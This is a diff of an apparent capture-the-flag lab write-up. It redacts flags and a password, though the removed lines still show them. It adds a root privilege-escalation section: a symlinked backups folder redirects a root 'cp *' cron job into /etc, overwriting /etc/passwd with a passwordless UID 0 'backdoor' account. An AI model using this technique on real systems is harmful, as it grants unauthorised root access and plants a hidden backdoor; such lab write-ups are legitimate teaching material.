@@ -85,7 +85,7 @@ uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
 
 ```bash
 bruce@ip-10-144-183-146:~$ cat flag1.txt 
-THM{Car3ful_witH_3v@l}
+THM{REDACTED}
 ```
 
 # Sudo permission
@@ -190,7 +190,7 @@ bruce@ip-10-144-183-146:~$ echo "NEUEDTIeN1MRDg5K" | base64 -d | xxd -p
 
 ![](Labs/Attachments/Pasted%20image%2020261016233528.png)
 
-There it is, `Gordon's` password. G0th@mR0ckz!
+There it is, `Gordon's` password.
 
 # Gordon
 
@@ -204,7 +204,7 @@ uid=1001(gordon) gid=1001(gordon) groups=1001(gordon)
 
 ```bash
 gordon@ip-10-146-150-95:~$ cat flag2.txt
-THM{X0R_XoR_XOr_xOr}
+THM{REDACTED}
 ```
 
 ## pspy64
@@ -237,13 +237,44 @@ cd /home/gordon/reports/
 cp * /home/gordon/backups/
 ```
 
-That's why reports and backups have the same files.
+That's why reports and backups have the same files. 
 
+## Privilege escalation
 
+I can exploit the `cron job` running `cp *` with unquoted wildcards in a user-writable directory. By creating a symlink from the destination to /etc/, we redirect the copy operation to write a malicious /etc/passwd as root.
 
+Create a file for the fake `passwd` entry.
 
+```bash
+echo 'backdoor::0:0::/root:/bin/bash' > passwd
+```
 
+Delete the `/backups` folder.
 
+Next step is to make a symlink for `backups` folder to `/etc`.
 
+```bash
+ln -s /etc /home/gordon/backups/
+```
+
+How it works is that when the cron job triggers, it will copy my `passwd` file to `/backups`. Since `/backups` is symlinked to `/etc`, it will copy it to that directory which will overwrite the `passwd` file.
+
+Now, you can see i have my own user with `UID=0` which is `root`.
+
+```bash
+gordon@ip-10-146-150-95:~$ cat /etc/passwd
+backdoor::0:0::/root:/bin/bash
+```
+
+# Root flag
+
+```bash
+gordon@ip-10-146-150-95:~$ su backdoor
+backdoor@ip-10-146-150-95:/home/gordon# cd /root
+backdoor@ip-10-146-150-95:~# ls
+root.txt  snap
+backdoor@ip-10-146-150-95:~# cat root.txt
+THM{REDACTED}
+```
 
 
